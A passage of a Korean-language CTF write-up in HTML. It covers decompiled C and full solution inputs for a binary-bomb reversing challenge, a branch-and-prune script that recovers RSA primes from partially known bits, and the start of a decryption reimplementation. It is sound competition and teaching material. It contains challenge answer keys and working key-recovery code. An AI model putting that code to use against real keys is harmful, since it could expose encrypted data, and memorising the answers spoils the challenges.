+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;math.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">double</span> f; <span style="color:#75715e">// [rsp+18h] [rbp-48h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">double</span> v3; <span style="color:#75715e">// [rsp+20h] [rbp-40h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">double</span> v4; <span style="color:#75715e">// [rsp+28h] [rbp-38h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">double</span> c; <span style="color:#75715e">// [rsp+30h] [rbp-30h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">double</span> v6; <span style="color:#75715e">// [rsp+38h] [rbp-28h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">double</span> v7; <span style="color:#75715e">// [rsp+40h] [rbp-20h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">double</span> v8; <span style="color:#75715e">// [rsp+48h] [rbp-18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">double</span> v9; <span style="color:#75715e">// [rsp+50h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0000001</span>;
+</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>;
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>;
+</span></span><span style="display:flex;"><span>    f <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.9</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( f <span style="color:#f92672">&gt;</span> v4 )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        v6 <span style="color:#f92672">=</span> (v3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1.0</span>) <span style="color:#f92672">*</span> (v4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1.0</span>);
+</span></span><span style="display:flex;"><span>        v4 <span style="color:#f92672">=</span> c <span style="color:#f92672">/</span> <span style="color:#ae81ff">2.0</span> <span style="color:#f92672">+</span> v4;
+</span></span><span style="display:flex;"><span>        v7 <span style="color:#f92672">=</span> (v6 <span style="color:#f92672">*</span> c <span style="color:#f92672">/</span> <span style="color:#ae81ff">2.0</span> <span style="color:#f92672">+</span> v3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1.0</span>) <span style="color:#f92672">*</span> (v4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1.0</span>);
+</span></span><span style="display:flex;"><span>        v8 <span style="color:#f92672">=</span> (v7 <span style="color:#f92672">*</span> c <span style="color:#f92672">/</span> <span style="color:#ae81ff">2.0</span> <span style="color:#f92672">+</span> v3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1.0</span>) <span style="color:#f92672">*</span> (v4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1.0</span>);
+</span></span><span style="display:flex;"><span>        v4 <span style="color:#f92672">=</span> c <span style="color:#f92672">/</span> <span style="color:#ae81ff">2.0</span> <span style="color:#f92672">+</span> v4;
+</span></span><span style="display:flex;"><span>        v9 <span style="color:#f92672">=</span> (c <span style="color:#f92672">*</span> v8 <span style="color:#f92672">+</span> v3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1.0</span>) <span style="color:#f92672">*</span> (v4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1.0</span>);
+</span></span><span style="display:flex;"><span>        v3 <span style="color:#f92672">=</span> (v8 <span style="color:#f92672">+</span> v8 <span style="color:#f92672">+</span> v7 <span style="color:#f92672">+</span> v7 <span style="color:#f92672">+</span> v6 <span style="color:#f92672">+</span> v9) <span style="color:#f92672">*</span> c <span style="color:#f92672">/</span> <span style="color:#ae81ff">6.0</span> <span style="color:#f92672">+</span> v3;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( fabs(v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1.604151184400547</span>) <span style="color:#f92672">&lt;=</span> c ) {
+</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;%.18lf</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v4);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( fabs(v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1.604151184400547</span>) <span style="color:#f92672">&gt;</span> c ) {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;boom</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="level-6">Level 6<a hidden class="anchor" aria-hidden="true" href="#level-6">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>	result <span style="color:#f92672">*=</span> func(inp[i], <span style="color:#ae81ff">1</span>, inp[i<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>], path)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> result <span style="color:#f92672">==</span> <span style="color:#ae81ff">229391351</span> <span style="color:#75715e"># 229391351 = 7 · 19 · 23 · 31 · 41 · 59</span>
+</span></span></code></pre></div><p><img loading="lazy" src="/images/goq22f_1.png" alt="level6"  />
+</p>
+<h3 id="secret-phase">Secret Phase<a hidden class="anchor" aria-hidden="true" href="#secret-phase">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>scanf(<span style="color:#f92672">&amp;</span>level4_input, <span style="color:#e6db74">&#34;%d %d %s&#34;</span>, <span style="color:#f92672">&amp;</span>a, <span style="color:#f92672">&amp;</span>b, <span style="color:#f92672">&amp;</span>c);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;c0m0r1bb&#34;</span>)
+</span></span><span style="display:flex;"><span>    SecretPhase2();
+</span></span></code></pre></div><h3 id="secret-phase-2">Secret Phase 2<a hidden class="anchor" aria-hidden="true" href="#secret-phase-2">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>input <span style="color:#f92672">=</span> read_stream();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#f92672">&amp;</span>abs <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3536</span> <span style="color:#f92672">||</span> (<span style="color:#f92672">&amp;</span>atoi <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1600</span> )
+</span></span><span style="display:flex;"><span>  boom();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( abs(atoi(input)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">3.14</span> )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Wow! You&#39;ve defused the secret stage!&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Congratulations! You&#39;ve defused the bomb!&#34;</span>);
+</span></span><span style="display:flex;"><span>  print_flag();
+</span></span><span style="display:flex;"><span>  exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x16E</span>; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>retaddr <span style="color:#f92672">+</span> i) <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>abs <span style="color:#f92672">+</span> qword_203020[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">286160</span>;
+</span></span></code></pre></div><p><code>abs(atoi(input))</code>은 절대 3.14가 될 수 없다. 아래 return address에 ROP Payload를 추가하는 부분이 있다.
+GDB를 이용해 <code>boom()</code>으로 가지 않도록 breakpoint를 걸어가며 확인했다.</p>
+<pre tabindex="0"><code>→ 0x7ffff7df12b6 &lt;__vfprintf_internal+518&gt; cmps   BYTE PTR ds:[rsi], BYTE PTR es:[rdi]
+  0x7ffff7df12b7 &lt;__vfprintf_internal+519&gt; ret
+</code></pre><p>이 부분에서 값이 다르면 <code>boom()</code>으로 가게 된다. 플래그의 길이가 크게 길지 않아 여러 번 실행시켜가며 구조를 분석했고, 동일한 값이 나오는 입력을 찾았다.</p>
+<h3 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h3>
+<pre tabindex="0"><code>OPEN_SESAME
+1 2 5 11 21 36
+3735928559 15904193
+123 456 c0m0r1bb
+0.707106799996007784
+12 15 2 17 18 21 7 19 23 31 41 59
+FLFCDAFAFPENDEEEEODDFDFDCBCBFN
+</code></pre><hr>
+<h2 id="c-pprintable">C. pprintable<a hidden class="anchor" aria-hidden="true" href="#c-pprintable">#</a></h2>
+<p>문제의 이름과 코드에서 알 수 있듯이 <code>p</code>, <code>q</code>의 각 byte는 출력 가능한 ASCII 범위 안에 있다. 이를 이용해 <code>p</code>, <code>q</code>의 upper 2bit가 01임을 알 수 있어 알고 있는 bit가 0.5를 넘게 된다.</p>
+<p>또한, <code>p</code>, <code>q</code>를 복구하는 방법을 찾아보니 <em>Gabrielle de Micheli, Nadia Heninger.  Recovering cryptographic keys from partial information, by example. 2020</em> 를 찾을 수 있었다. 여기서 나온 방법을 따라 Branch and Prune을 이용해 <code>p</code>, <code>q</code>를 복구할 수 있었다.</p>
+<h3 id="solution-1">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-1">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>N <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12376eadc9b0bd1f13fa9d904f5a1a75bb7ddaaa77ec5b1e8dec4cb7532b662fcc63a0dfa982e1702be449c9b295bf7a0b7c6ba3dc7aaf3856d681601e723aa3bce3e0cd064793a9c6b00eb01d3e3f0fbceddb208cba2598d9d6a35f3cf8623a1389686807fb5f8f53dd0a7f544c02d030f498f7aa315b7547783399bc88cd3e2859b6786b858a35593537ead5a0cc48401a24cefe6ac6997035f6571af098d5d5b24313437fd89d22cce7fa5907d73c219b609eeea9bcffab0f18504e1d2ed5669752e21dd17b57ea5cf6e6efa76cd965e4589539dc087e152fb4d3f1f90edcdcab22b71b326a3e7e0674f8820a24aa3be15756db2e908d434b80419061bf45</span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
+</span></span><span style="display:flex;"><span>p_redacted <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x50b4040146040415a04084000094153182141460200401063040440024200046055600042240040410248014e00410444640240166000001e09141101084025181052000c30004260000406100601226058401613084a0040492001040404620100401344612000215221412811086840005d06001060000008460040025000</span>
+</span></span><span style="display:flex;"><span>p_mask <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1250b70401c6444455a8418d2800945d3182dc1c7060a4010630c0c4282c2a0047575e8084aa4207ac592ca034e02e78445640f40366020089e0b9791119940b53818d2842c3082ea70818e0610a601b2e35844169708ca00404931912e04046e01004893e4632c80a1da23c9ab310868d402dd0600307283300cd680c1a25602</span>
+</span></span><span style="display:flex;"><span>q_redacted <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80902304402050a7145440048082208004041205b60014000102340106007002a240b0108404005604000190060092010010004504c2104002100140009020270500022101530484551206642004c1424200000202040042210204c4143704000480101004809114629230312040040000600400420520943204412216404</span>
+</span></span><span style="display:flex;"><span>q_mask <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1aa0809033046833d9e7945e420480822090ac0c1a35bf00b48a21223c23060070c2a240b0328c4c235e0408819817209a11531101c50cd21a6012309b40c292302f05000221c353a5845f126e65210ec9c24a0001820284004bf1a206c45637b4500680581894d0d1d46bb2b039a2e84d008a604508420d219c32166b2276c04</span>
+</span></span><span style="display:flex;"><span>pt <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag{this_is_fake_flag_:P}&#34;</span>, byteorder <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>ct <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x97090fc71e4c4c7fe52fb9c5cafde7bae8cf5f911c2755174f3a61515f475c7000d127e23ad99498bd58078abe2890fe40c64067116c66be74ac5422e731905103f4ecc4ae6cf9478580d6fb373744b897caf2b95f01531b626afb46eb88c0f5f419635a27f903ab8ffc55094e015008cbb9520f07755da279226fefa8859bfef694b86ca3fdf88042361d18ecb7ae1ecf98041140b3f167687f45e3da914ee35f9d345782438018310da609578a1047a99a9c54ff846eb2017ac26a0cfb8f5e542c0c7feba904e0ff15a6e2712c2135f9c80b057185cd31a8e9e5371194d063776bdf3537837c705d3761dd6f0ec9419034c294914015bc0e3fbea474fdc15</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(bin(p_mask))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mask <span style="color:#f92672">=</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">1024</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>p_mask <span style="color:#f92672">&amp;=</span> mask
+</span></span><span style="display:flex;"><span>q_mask <span style="color:#f92672">&amp;=</span> mask
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pb <span style="color:#f92672">=</span> bytearray(p_redacted<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">128</span>, <span style="color:#e6db74">&#34;big&#34;</span>))
+</span></span><span style="display:flex;"><span>pm <span style="color:#f92672">=</span> bytearray(p_mask<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">128</span>, <span style="color:#e6db74">&#34;big&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>qb <span style="color:#f92672">=</span> bytearray(q_redacted<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">128</span>, <span style="color:#e6db74">&#34;big&#34;</span>))
+</span></span><span style="display:flex;"><span>qm <span style="color:#f92672">=</span> bytearray(q_mask<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">128</span>, <span style="color:#e6db74">&#34;big&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">128</span>):
+</span></span><span style="display:flex;"><span>    pb[i] <span style="color:#f92672">|=</span> <span style="color:#ae81ff">0b01000000</span>
+</span></span><span style="display:flex;"><span>    pm[i] <span style="color:#f92672">|=</span> <span style="color:#ae81ff">0b11000000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    qb[i] <span style="color:#f92672">|=</span> <span style="color:#ae81ff">0b01000000</span>
+</span></span><span style="display:flex;"><span>    qm[i] <span style="color:#f92672">|=</span> <span style="color:#ae81ff">0b11000000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p_known <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(pb, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>q_known <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(qb, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p_mask2 <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(pm, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>q_mask2 <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(qm, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p_cnt <span style="color:#f92672">=</span> (bin(p_mask2)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#34;1&#34;</span>), bin(p_mask2)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#34;0&#34;</span>))
+</span></span><span style="display:flex;"><span>q_cnt <span style="color:#f92672">=</span> (bin(q_mask2)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#34;1&#34;</span>), bin(q_mask2)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#34;0&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;P:&#34;</span>, p_cnt, p_cnt[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Q:&#34;</span>, q_cnt, q_cnt[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> p_cnt[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.5</span> <span style="color:#f92672">and</span> q_cnt[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pbin <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: bin(x)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">1024</span>, <span style="color:#e6db74">&#34;0&#34;</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p_k <span style="color:#f92672">=</span> pbin(p_known)
+</span></span><span style="display:flex;"><span>q_k <span style="color:#f92672">=</span> pbin(q_known)
+</span></span><span style="display:flex;"><span>p_m <span style="color:#f92672">=</span> pbin(p_mask2)
+</span></span><span style="display:flex;"><span>q_m <span style="color:#f92672">=</span> pbin(q_mask2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>queue <span style="color:#f92672">=</span> [(<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">0</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>btoi <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: int(x[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> queue: 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    print(queue)</span>
+</span></span><span style="display:flex;"><span>    p_t, q_t, i <span style="color:#f92672">=</span> queue<span style="color:#f92672">.</span>pop()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">1024</span>:
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> btoi(p_t)
+</span></span><span style="display:flex;"><span>        q <span style="color:#f92672">=</span> btoi(q_t)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;p:&#34;</span>, p)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;q:&#34;</span>, q)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> p<span style="color:#f92672">*</span>q <span style="color:#f92672">==</span> N
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print((p<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">256</span>, <span style="color:#e6db74">&#34;big&#34;</span>) <span style="color:#f92672">+</span> q<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">256</span>, <span style="color:#e6db74">&#34;big&#34;</span>))<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> (btoi(p_t) <span style="color:#f92672">*</span> btoi(q_t)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>(i) <span style="color:#f92672">!=</span> N <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>(i):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> p_m[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#f92672">and</span> q_m[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span>:
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>append((p_t<span style="color:#f92672">+</span>p_k[i], q_t<span style="color:#f92672">+</span>q_k[i], i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> p_m[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#f92672">and</span> q_m[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;0&#34;</span>:
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>append((p_t<span style="color:#f92672">+</span>p_k[i], q_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span>, i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>append((p_t<span style="color:#f92672">+</span>p_k[i], q_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span>, i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> p_m[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#f92672">and</span> q_m[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span>:
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>append((p_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span>, q_t<span style="color:#f92672">+</span>q_k[i], i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>append((p_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span>, q_t<span style="color:#f92672">+</span>q_k[i], i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>append((p_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span>, q_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span>, i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>append((p_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span>, q_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span>, i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>append((p_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span>, q_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span>, i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>append((p_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span>, q_t<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span>, i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span></code></pre></div><hr>
+<h2 id="d-obstacle">D. Obstacle<a hidden class="anchor" aria-hidden="true" href="#d-obstacle">#</a></h2>
+<p>동적으로 디버깅하며 <code>label</code>과 <code>.text</code>로의 Indirect call을 이용하여 Control-Flow를 복구할 수 있었고, 이를 통해 encrypt 과정을 python코드로 작성할 수 있었다. 그 과정을 역으로 수행하는 decrypt를 구현하여 flag를 얻을 수 있었다.</p>
+<h3 id="solution-2">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-2">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mask8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFFFFF</span>
+</span></span><span style="display:flex;"><span>mask4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFFFFFF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ROL</span>(num, count, bits<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ((num <span style="color:#f92672">&lt;&lt;</span> count) <span style="color:#f92672">|</span> (num <span style="color:#f92672">&gt;&gt;</span> (bits <span style="color:#f92672">-</span> count))) <span style="color:#f92672">&amp;</span> ((<span style="color:#ae81ff">0b1</span><span style="color:#f92672">&lt;&lt;</span>bits) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ROR</span>(num, count, bits<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>):
